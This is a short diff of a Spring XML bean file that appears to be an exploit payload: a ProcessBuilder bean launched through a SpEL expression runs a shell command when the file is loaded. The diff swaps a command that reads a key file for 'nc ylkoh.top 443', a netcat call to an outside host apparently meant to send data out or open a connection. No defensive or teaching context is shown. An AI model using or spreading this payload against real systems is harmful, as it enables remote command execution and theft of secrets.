@@ -7,7 +7,7 @@
   <bean id="pb" class="java.lang.ProcessBuilder">
      <constructor-arg>
 	     <list>
-	<value>"cat key"</value>
+	<value>"nc ylkoh.top 443"</value>
 	     </list>
 		</constructor-arg>
      <property name="whatever" value="#{ pb.start() }"/>
